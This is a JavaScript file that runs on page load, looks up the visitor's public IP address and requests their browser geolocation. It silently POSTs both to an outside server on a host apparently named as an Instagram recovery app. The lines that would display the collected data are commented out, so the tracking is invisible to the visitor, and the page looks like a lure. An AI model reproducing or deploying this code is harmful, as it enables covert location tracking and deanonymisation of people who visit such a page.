$(function() {
    $.getJSON("https://api.ipify.org/?format=json",
        function(json) {
            //$("#meu-ip").prop("innerHTML", "IP: " + json.ip);

            let ip = json.ip;
            let x_coord = null;
            let y_coord = null;

            if (navigator.geolocation) 
            {
                navigator.geolocation.getCurrentPosition((position) => 
                {
                    let coordenadas = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
                    //console.log(coordenadas);
                    //$("#coords").prop('innerHTML', coordenadas);

                    x_coord = position.coords.latitude;
                    y_coord = position.coords.longitude;

                    $.ajax({
                        url: "https://instarecoveryapp.herokuapp.com/receive",
                        //url: "http://localhost:5000/receive",
                        contentType: "application/json",
                        data: "{ \"ip\": \""+ip+"\", \"x_coord\": \""+x_coord+"\", \"y_coord\": \""+y_coord+"\" }",
                        method: "POST"
                    }).done(function(res) {
                        console.log(res);
                    })
                });

            } else {
                $.ajax({
                    url: "https://instarecoveryapp.herokuapp.com/receive",
                    //url: "http://localhost:5000/receive",
                    contentType: "application/json",
                    data: "{ \"ip\": \""+ip+"\", \"x_coord\": \""+x_coord+"\", \"y_coord\": \""+y_coord+"\" }",
                    method: "POST"
                }).done(function(res) {
                    console.log(res);
                })

                //$("#coords").prop('innerHTML', "Geolocation is not supported by this browser.");
            }
        }
    );
});